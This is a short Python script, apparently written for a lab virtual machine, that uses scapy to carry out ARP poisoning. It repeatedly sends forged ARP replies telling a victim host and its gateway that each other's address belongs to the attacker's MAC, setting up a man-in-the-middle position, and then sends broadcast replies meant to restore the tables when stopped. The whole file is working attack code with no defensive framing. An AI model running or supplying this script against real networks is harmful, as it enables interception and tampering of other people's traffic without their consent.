from scapy.all import ARP, send
import time


# ARP Spoofing


victim_ip   = "10.0.0.194"   # VM IP
gateway_ip  = "10.0.0.191"     # NAT gateway
attacker_mac = "00:0c:29:a8:7a:9b" # Attacker MAC address

# Create ARP replies
arp_to_victim = ARP(
    op=2,                   # ARP reply
    psrc=gateway_ip,       # Claim to be gateway
    pdst=victim_ip,        # send to the victim
    hwsrc=attacker_mac     # Use attacker MAC address
)

# ARP reply to gateway
arp_to_gateway = ARP(
    op=2,
    psrc=victim_ip,        # claim to be victim
    pdst=gateway_ip,       # Send to gateway
    hwsrc=attacker_mac
)

print("Starting ARP poisoning")
print(f"Victim  : {victim_ip}")
print(f"Gateway : {gateway_ip}")
print(f"Attacker MAC : {attacker_mac}")

try:
    while True:
        send(arp_to_victim, verbose=False)
        send(arp_to_gateway, verbose=False)
        print(f"[+] Poisoned {victim_ip} and {gateway_ip}")
        time.sleep(2)

except KeyboardInterrupt:
    print("\nStopping ARP spoofing.")

    # Restore: send correct info with broadcast
    send(ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)
    send(ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)

    print("Restored")
